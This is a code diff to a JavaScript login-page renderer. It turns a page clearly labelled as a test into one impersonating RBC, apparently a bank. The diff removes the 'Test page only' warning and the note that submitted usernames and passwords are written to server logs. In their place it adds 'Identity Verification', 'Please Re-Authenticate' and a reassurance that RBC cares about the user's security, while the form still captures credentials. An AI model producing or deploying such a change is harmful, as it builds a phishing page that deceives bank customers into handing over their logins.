@@ -128,12 +128,7 @@ function renderPage({ content, title = "Test Login Page Below" }) {
     <a class="skip-link" href="#main">Skip to main content</a>
     <main id="main" class="page-shell">
       <section class="hero" aria-labelledby="page-title">
-        <p class="eyebrow">Mobile UI Study</p>
-        <h1 id="page-title">Test Login Page Below</h1>
-      </section>
-      <section class="test-banner" role="note">
-        <strong>Test page only.</strong>
-        Use test data only. Do not enter real usernames, passwords, banking details, or production credentials.
+        <h1 id="page-title">Identity Verification</h1>
       </section>
       ${content}
     </main>
@@ -144,7 +139,7 @@ function renderPage({ content, title = "Test Login Page Below" }) {
 function renderLoginPage() {
   return renderPage({
     content: `<section class="section-block" aria-labelledby="login-section-title">
-        <h2 id="login-section-title">Sign in details</h2>
+        <h2 id="login-section-title">Please Re-Authenticate</h2>
         <form class="login-card" action="/login" method="post" data-login-form novalidate>
           <div class="field-row">
             <label for="username">Username</label>
@@ -175,8 +170,8 @@ function renderLoginPage() {
             <span></span>
           </div>
           <div>
-            <h3>Test credentials only</h3>
-            <p>The submitted username and password are written to the server logs so the capture path can be verified.</p>
+            <h3>Why do I Need to Sign-In Again?y</h3>
+            <p>Here at RBC we care about your security. Re-authenticating allows us to confirm it's really you.</p>
           </div>
         </div>
       </section>`
